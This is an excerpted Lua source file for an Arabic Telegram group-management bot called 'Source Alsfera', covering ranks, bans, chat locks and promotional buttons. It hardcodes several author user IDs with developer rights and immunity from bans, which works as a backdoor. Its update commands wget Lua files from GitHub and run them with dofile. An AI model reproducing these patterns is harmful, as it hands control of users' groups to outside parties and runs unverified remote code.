...
if res ~= 200 then
print('\27[0;31m𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕\n التوكن غير صحيح تاكد منه ثم ارسله')
else
io.write('\27[0;31m تم حفظ التوكن بنجاح \na𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕\n27[0;39;49m')
database:set(id_server..":token",token)
end 
else
print('\27[0;35m𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕 ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ahmedsiria/alsfera/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1746100553,1487613664,1868827696,14876136629924,14876136629924,1892231097}   
...
if tonumber(user_id) == tonumber(1746100553) then  
var = true  
elseif tonumber(user_id) == tonumber(1868827696) then
var = true  
elseif tonumber(user_id) == tonumber(14876136629924) then
var = true  
elseif tonumber(user_id) == tonumber(1487613664) then
var = true  
elseif tonumber(user_id) == tonumber(14876136629924) then
var = true  
...
local UserName = (data.username_ or "el_harere")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼┇𓆩 𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨 𓏴   𓆪.")  
...
os.execute('wget https://raw.githubusercontent.com/ahmedsiria/alsfera/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'✧︙ تم تحديث السورس \n✧︙ لديك اخر اصدار لسورس سسوريا\n✧︙ الاصدار » { v 1.6 }')
dofile('DRAGON.lua')  
end
if text == '𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕' and DevSoFi(msg) then
...
{{text = '𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕', url="t.me/el_harere"}}, 
} 
...
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'✧︙ اصدار سورس سسوريا \n✧︙ الاصدار »{ v 1.6 }')
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'اقمـد من القمـدن  ياروحـي.', url="t.me/Ahmed_siria"}},
}
local msg_id = msg.id_/2097152/0.5
...
usertext = '\n✧︙ العضو » ['..result.title_..'](t.me/'..(username or 'el_harere')..')'
status  = '\n✧︙ تم ترقيته مطور'
...
usertext = '\n✧︙ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'el_harere')..')'
status  = '\n✧︙ تم ترقيته مطور'
...
if DRAGON1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✧︙ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'el_harere')..') \n✧︙ '..DRAGON1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0,"✧︙ العضو : {["..data.first_name_.."](T.ME/el_harere)}\n✧︙ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "✧︙ عذرا » {["..data.first_name_.."](T.ME/el_harere)}\n✧︙ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
╭──── ● ☆ ● ────╮
☆
[𝒘𝒆𝒍𝒄𝒐𝒎𝒆 𝒕𝒐 𝒔𝒐𝒖𝒓𝒄𝒆   ](t.me/el_harere)
[alsfera 𝒕𝒉𝒆 𝒃𝒆𝒔𝒕 𝒔𝒐𝒖𝒓𝒄𝒆    ](t.me/el_harere)
[𝒐𝒏 𝒕𝒆𝒍𝒆𝒆𝒈𝒓𝒂𝒎 ](t.me/el_harere)
☆
╰──── ● ☆ ● ────╯
[⍟  𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙾𝙽 𝚃𝙴𝙻𝙴𝙶𝚁𝙰𝙼](t.me/el_harere)
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = '⌯𝐃𝐕 𝐀𝐋𝐒𝐀𝐅𝐈𝐑𝐀⌯ ', url="https://t.me/S_A_U6"},{text = '⌯𝐄𝐋𝐇𝐀𝐑𝐄𝐑𝐄⌯', url="https://t.me/Bebo_ELHARERY"}},  
  {{text = '𝙒𝙧 𝙎𝙞𝙧𝙞𝙖 ',url="t.me/siria22"}},
{{text = '𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨 ', url="t.me/el_harere"}},  
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/S_A_U6&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--------------------------------------------------------------------------------------------------------------
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'✧︙ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'el_harere')..') \n✧︙ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✧︙ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'el_harere')..') \n✧︙ تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(1746100553) then  
send(msg.chat_id_, msg.id_, " ✧ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1868827696) then  
send(msg.chat_id_, msg.id_, " ✧ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if result.id_ == tonumber(1746100553) then
send(msg.chat_id_, msg.id_, " ✧ لا يمكنك حظر مبرمج السورس \n")
return false 
end
if result.id_ == tonumber(1868827696) then
send(msg.chat_id_, msg.id_, " ✧ لا يمكنك حظر مبرمج السورس \n")
return false 
end
...
if tonumber(userid) == tonumber(1746100553) then  
send(msg.chat_id_, msg.id_, " ✧ لا تسطيع حظر مبرمج السورس عام")
return false 
end
if tonumber(userid) == tonumber(1868827696) then  
send(msg.chat_id_, msg.id_, " ✧ لا تسطيع حظر مبرمج السورس عام")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ahmedsiria/alsfera/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n✧︙ اهلا بك في متجر ملفات سسوريا\n✧︙ ملفات السورس ↓\n𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕\n\n"
local TextE = "\n𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕\n✧︙ علامة تعني { ✔️ } ملف مفعل\n✧︙ علامة تعني { ✖ } ملف معطل\n✧︙ قناة سورس سسوريا ↓\n".."✧︙ [اضغط هنا لدخول](t.me/el_harere) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/ahmedsiria/alsfera/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_,"✧︙ عذرا الملف لايدعم سورس سسوريا \n") 
end
return false
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n✧︙ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'el_harere')..')'
status  = '\n✧︙ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n✧︙ العضو » '..userid..''
...
t = "\n ✧ قائمه المرفوعين 🥺😂 \n⩹━━━━━━ التاك دا مش بتاع السورس 😂 دا برعاية جامبول 𖠱²² ━━━━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
'\nءٴ≪ـــــــــــــــــــــ𓆩 𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨 𓏴   𓆪ـــــــــــــــــــــ≫ٴ'..
...
'\n𖤛︙  علامة ال {🔓} تعني مفعل'..
'\n𖤛︙  علامة ال {🔐} تعني معطل'..
'\nءٴ≪ـــــــــــــــــــــ𓆩 𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨 ??   𓆪ـــــــــــــــــــــ≫ٴ'..
'\n'..'𖤛︙  امر صيح » { '..kickme..
...
' }\n'..'𖤛︙  الرفع » { '..setadd..
' }\n'..'𖤛︙  الحظر » { '..banm..' }\n\nٴ≪ـــــــــــــــــــــ𓆩 𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨 𓏴   𓆪ـــــــــــــــــــــ≫ٴ\n𖤛︙ قناة سورس الوون ↓\n [ ❍ ┇𓆩 𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨 𓏴   𓆪.](t.me/SOURCE_SYRIA) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
{{text = ' مـبرمج السـورس ',url="t.me/Ahmed_siria"}},  
}
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n✧︙ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'el_harere')..')'..'\n✧︙ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'سسوريا').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'سسوريا')
local DRAGON_Msg = {
'عمغي 🥺💕.',
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙎𝙊𝙐𝙍𝘾𝙀  𝙎𝙞𝙧𝙞𝙖.',url="t.me/el_harere"}},
}
local msg_id = msg.id_/2097152/0.5
...
database:set(bot_id.."el_harere:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'✧ تم تفعيل الانستا')
database:set(bot_id.."el_harere:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."el_harere:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."el_harere:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"℘︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."el_harere:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."el_harere:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس سسوريا يعني لو بكتهن راح اعرفك انت الاخذتهن
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'سسوريا').." غادر" or text == 'بوت غادر' then  
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'السفيره')
local DRAGON_Msg = {
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'el_harere')..')'
local iduser = result.sender_user_id_
...
*𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕*
➫ .[ ❍ ┇𓆩 𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨 𓏴   𓆪. ](t.me/el_harere)➤
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
{
{text = '𝐃𝐑𝐀𝐆𝐎𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋', url="t.me/el_harere"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
send(msg.chat_id_, msg.id_, t..'𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕\n℘︙ ➫ .[ ❍ ┇𓆩 𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨 𓏴   𓆪. ](t.me/el_harere)➤ ')
end
...
🍁الاشعارات
𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕
[🍁𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕 🍁](t.me/el_harere)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
🍁صورتي 
𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕
[🍁𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕 ⚡️](t.me/el_harere)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕
[✧ ????𝗨𝗥𝗖?? 𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨 𓏴  ✧](t.me/el_harere)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
🗯️التاريخ
𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕
[🗯️ 𖠕━┅┅┄⟞❲𝑺𝑶𝑼𝑹𝑪𝑬 𝑨𝑳𝑺𝑭𝑬𝑹𝑨❳⟝┄┉┉━𖠕 🗯️](t.me/el_harere)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'سسوريا')
...
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/el_harere)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/el_harere)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/el_harere)') 
return false
end

if text == 'انا مين' and CoSu(msg) then 
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/el_harere)') 
return false
end

if text == 'انا مين' and Constructor(msg) then 
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/el_harere)') 
return false
end

if text == 'انا مين' and BasicConstructor(msg) then 
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂✧](t.me/el_harere)') 
return false
end

if text == 'انا مين' and Manager(msg) then 
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/el_harere)') 
return false
end

if text == 'انا مين' and Mod(msg) then 
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/el_harere)') 
return false
end

if text == 'انا مين' and Special(msg) then 
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/el_harere)') 
return false
end

if text == 'انا مين' then
send(msg.chat_id_,msg.id_, '[انـت عضو قمـيل 🥺❤️](t.me/el_harere)') 
return false
end
...
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Ahmed_siria&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓌹 ᯓ مــبـرمـج الســورس ★ 𓌺',url="t.me/S_A_U6"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
...
if text == 'بلال' or text == 'الحريري' then  
local Text = [[  
من مشاهـير بلدك
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = 'الحـريــري',url="t.me/DV_ELHARERY"}},  

}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/DV_ELHARERY&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'السفيره' or text == 'ملكة جمال التلي' then  
local Text = [[  
࿘  مــلــكــة التــلــي 🍁࿘ 
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = '࿘ الــسـفـيـره࿘ ',url="t.me/S_A_U6"}},  

}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Esre_4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'حسناء' or text == 'القمر' then  
local Text = [[  
ملكـة جمـال التـلي صاحبة القلب الطيب 😌❤️
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = '𓆩♥𓆪𝒉𝒂𝒔𝒏𝒂𝒂 𝒎𝒐𝒉𝒂𝒎𝒆𝒅😌🦋✨',url="t.me/HASNAA828"}},  
...
if text == 'االالعاب ' or text == 'الالعاب المتطوره' or text == 'العاب متطوره' then  
local Text = [[  
...
{{text = '✧قنـآة السـورس ✧', url="https://t.me/el_harere"},{text = '✧مــبـرمج السورس ✧', url="https://t.me/Ahmed_siria"}}, 
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/el_harere&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
